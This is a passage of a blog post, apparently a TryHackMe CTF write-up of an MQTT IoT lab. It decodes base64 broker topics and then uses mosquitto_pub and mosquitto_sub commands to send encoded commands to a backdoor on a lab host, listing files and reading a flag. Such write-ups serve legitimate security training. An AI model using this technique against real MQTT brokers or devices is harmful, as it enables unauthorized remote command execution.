<span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ=="</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"registered_commands"</span>:[<span class="hljs-string">"HELP"</span>,<span class="hljs-string">"CMD"</span>,<span class="hljs-string">"SYS"</span>],<span class="hljs-string">"pub_topic"</span>:<span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span>,<span class="hljs-string">"sub_topic"</span>:<span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span>}%  </span></pre><p id="3a0f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding there is registered_command and publiser_topic also subscriber_topic.</p><p id="75c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this MQTT model publisher always publish data and the subscriber always receives data but the subscriber can‚Äôt tell the publisher or IoT device what to do or what to publish (cause it is precoded). So, there might be a security vulnerability. We have to find out :)</p><p id="6e63" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In decoded section, this publisher topic ‚ÄúU4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub‚Äù is registered with the commands ‚ÄúHELP‚Äù,‚ÄùCMD‚Äù,‚ÄùSYS‚Äù. Let‚Äôs check What can do with this stuff.</p><p id="297d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to receive data from the publisher. So, We have to start our subscribers. For that use this command.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0853" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="e29d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we going to simulate the IoT device. For that, we use subscriber id ‚ÄúXD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub‚Äò and send a message to the subscriber.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="89e0" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"simple_massage"</span> -h 10.10.20.204</span></pre><p id="2817" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here ‚Äò-m‚Äô flag for our massage. Let‚Äôs check what subscribers got.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8db2" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=</span></pre><p id="2e16" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Another base64 encoded string. Now we are going to decode the base64 string.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="4f8c" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ÓÇ∞ <span class="hljs-built_in">echo</span> <span class="hljs-string">"SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk="</span> | <span class="hljs-built_in">base64</span> -d<br>Invalid message format.<br>Format: <span class="hljs-built_in">base64</span>({<span class="hljs-string">"id"</span>: <span class="hljs-string">"&lt;backdoor id&gt;"</span>, <span class="hljs-string">"cmd"</span>: <span class="hljs-string">"&lt;command&gt;"</span>, <span class="hljs-string">"arg"</span>: <span class="hljs-string">"&lt;argument&gt;"</span>})%</span></pre><p id="fd8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Interesting! we got a massage format and the communication is base64 decoded. Here MQTT was expecting a base64 decoded massage and also want ‚Äòid‚Äô, ‚Äòcmd‚Äô, and ‚Äòarg‚Äô. So, let‚Äôs make things right.</p><p id="c803" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we got ‚Äòid‚Äô = ‚Äúcdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d‚Äù and it‚Äôs accepting cmd ‚Äú‚ÄòHELP‚Äô, ‚ÄòCMD‚Äô, ‚ÄòSYS‚Äô‚Äù. We are going to use ‚ÄúCMD‚Äô and as ‚Äòarg‚Äô we are going to use ‚Äúls‚Äù.</p><p id="72c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The massage will be:</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="715b" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ls"</span><span class="hljs-punctuation">}</span></span></pre><p id="57c9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to encode it on base:</p><pre id="abfa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj">‚Äúe2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==‚Äù</pre><p id="02d3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we send this base64 string as a massage. Our command will be:</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0f02" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ=="</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="d217" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We received something encoded in base64.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="6762" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9</span></pre><p id="8764" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After Decode the base64 string finds a text file called ‚Äúflag .txt‚Äù</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="97a4" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag.txt\n}</span></span></pre><p id="0704" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, Let‚Äôs grab our flag. For that, we have to change the argument. And it will be ‚Äòarg‚Äô ‚Äúcat flag.txt‚Äù</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="a03d" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cat flag.txt"</span><span class="hljs-punctuation">}</span></span></pre><pre class="fo abx abp anr bo ans ba bj"><span id="d6be" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"{"</span><span class="hljs-built_in">id</span><span class="hljs-string">": "</span>cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d<span class="hljs-string">", "</span>cmd<span class="hljs-string">": "</span>CMD<span class="hljs-string">", "</span>arg<span class="hljs-string">": "</span><span class="hljs-built_in">cat</span> flag.txt<span class="hljs-string">"}"</span> | <span class="hljs-built_in">base64</span><br><br>e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K</span></pre><p id="d204" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We have to decode it in base64 then we send another massage.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0792" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="164d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In our subscriber part, we receive another base64 massage.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="cb44" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9</span></pre><p id="86b7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hopefully, after decoding this string we‚Äôll get our flag! Let‚Äôs see‚Ä¶.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="1bb5" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali ÓÇ∞ ~/ctf/thm ÓÇ∞ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag{..........}</span></span></pre><p id="4ad3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bingoo!!! we got our CTF flag‚Ä¶‚Ä¶.</p><blockquote class="abq abr abs"><p id="ef65" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p></blockquote><p id="4755" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Happy Hacking!!!!! See you next time in another post :)</p><p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p><p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>:¬†<a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p><p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Bugged~</strong></p></div></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Jan 7, 2024</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html&amp;via=sakibulalikhan&amp;text=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share invert twitter" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> <span>Twitter</span> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html&amp;media=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fmedia%2Fposts%2F5%2FBugged-Tryhackme-CTF-Writeup.jpg&amp;description=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share invert pinterest" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#pinterest"/></svg> <span>Pinterest</span> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert mix" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#mix"/></svg> <span>Mix</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=Bugged%20Tryhackme%20CTF%20Writeup&amp;url=https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=Bugged%20Tryhackme%20CTF%20Writeup https%3A%2F%2Fsakibulalikhan.pages.dev%2Fbugged-tryhackme-ctf-writeup.html" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://sakibulalikhan.pages.dev/tryhackme-or-md2pdf-or-ctf-writeup.html" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  TryHackMe | MD2PDF | CTF Writeup "><span class="btn__icon">‚Üê</span> <span class="btn__text">TryHackMe | MD2PDF | CTF Writeup</span> </a><a href="https://sakibulalikhan.pages.dev/takeover-tryhackme-writeup.html" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  TakeOver TryHackMe Writeup "><span class="btn__text">TakeOver TryHackMe Writeup</span> <span class="btn__icon">‚Üí</span></a></div></nav></article><div class="post__comments"><div class="comments"><div class="comments-wrapper"><h2>Comments</h2><div id="disqus_thread"></div><noscript>Please enable JS to use the comments form.</noscript><script type="text/javascript">var disqus_config = function () {
							this.page.url = 'https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html';
							this.page.identifier = '5'; 
							this.language = 'en_GB';
						};
						
						
				var disqus_element_to_check = document.getElementById('disqus_thread');

				if ('IntersectionObserver' in window) {
					var iObserver = new IntersectionObserver(
						(entries, observer) => {
							entries.forEach(entry => {
								if (entry.intersectionRatio >= 0.1) {
									(function () {
										var d = document, s = d.createElement('script');
										s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
										s.setAttribute('data-timestamp', +new Date());
										(d.head || d.body).appendChild(s);
									})();
									observer.unobserve(entry.target);
								}
							});
						},
						{
							threshold: [0, 0.2, 0.5, 1]
						}
					);

					iObserver.observe(disqus_element_to_check);
				} else {
					(function () {
						var d = document, s = d.createElement('script');
						s.src = 'https://'+('sakibulalikhan-github-io').trim()+'.disqus.com/embed.js';
						s.setAttribute('data-timestamp', +new Date());
						(d.head || d.body).appendChild(s);
					})();
				}</script><script type="text/javascript"></script></div></div></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>Sakibul Ali Khan ‚Ä¢¬†¬© 2024 ‚Ä¢ Offens!ve Blogs</p></div><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://www.youtube.com/@sakibulalikhan" aria-label="Youtube"><svg><use xlink:href="https://sakibulalikhan.pages.dev/assets/svg/svg-map.svg#youtube"/></svg></a></div></div></footer></div><script defer="defer" src="https://sakibulalikhan.pages.dev/assets/js/scripts.min.js?v=74fad06980c30243d91d72c7c57fcdb8"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'sidebar',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-line-numbers.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/clipboard.min.js"></script><script defer="defer" src="https://sakibulalikhan.pages.dev/media/plugins/syntaxHighlighter/prism-copy-to-clipboard.min.js"></script></body></html>